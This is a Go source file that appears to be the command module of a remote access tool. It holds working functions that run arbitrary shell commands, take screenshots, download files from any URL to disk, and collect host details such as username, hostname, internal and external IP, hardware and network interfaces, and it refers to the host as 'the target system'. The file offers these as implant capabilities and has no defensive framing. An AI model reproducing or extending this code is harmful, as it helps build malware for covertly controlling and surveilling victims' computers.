package commands

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	netutil "github.com/shirou/gopsutil/v3/net"
)

// ExecCommand executes a shell command and returns the combined output.
func ExecCommand(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

// CaptureScreen captures the primary monitor and returns the image as a PNG byte buffer.
func CaptureScreen() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

// DownloadFile downloads a file from a URL to a local destination.
func DownloadFile(url, dest string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

// GetSystemInfo retrieves metadata about the target system.
func GetSystemInfo() (string, error) {
	var sb strings.Builder

	hInfo, _ := host.Info()
	vMem, _ := mem.VirtualMemory()
	dUsage, _ := disk.Usage("/")
	if runtime.GOOS == "windows" {
		dUsage, _ = disk.Usage("C:")
	}
	cpuInfo, _ := cpu.Info()
	interfaces, _ := netutil.Interfaces()

	// External IP
	extIP := "Unknown"
	resp, err := http.Get("https://api.ipify.org")
	if err == nil {
		ip, _ := io.ReadAll(resp.Body)
		extIP = string(ip)
		resp.Body.Close()
	}

	// Internal IP
	intIP := "Unknown"
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					intIP = ipnet.IP.String()
					break
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("OS: %s %s\n", hInfo.OS, hInfo.PlatformVersion))
	sb.WriteString(fmt.Sprintf("Hostname: %s\n", hInfo.Hostname))
	sb.WriteString(fmt.Sprintf("Username: %s\n", os.Getenv("USERNAME")))
	if runtime.GOOS != "windows" {
		sb.WriteString(fmt.Sprintf("Username: %s\n", os.Getenv("USER")))
	}
	sb.WriteString(fmt.Sprintf("External IP: %s\n", extIP))
	sb.WriteString(fmt.Sprintf("Internal IP: %s\n", intIP))
	sb.WriteString(fmt.Sprintf("CPU: %s\n", cpuInfo[0].ModelName))
	sb.WriteString(fmt.Sprintf("RAM: %.2f GB / %.2f GB\n", float64(vMem.Available)/1024/1024/1024, float64(vMem.Total)/1024/1024/1024))
	sb.WriteString(fmt.Sprintf("Disk Usage: %.2f%%\n", dUsage.UsedPercent))
	sb.WriteString("\nNetwork Interfaces:\n")
	for _, iface := range interfaces {
		if len(iface.Addrs) > 0 {
			sb.WriteString(fmt.Sprintf("- %s: %v\n", iface.Name, iface.Addrs))
		}
	}

	return sb.String(), nil
}
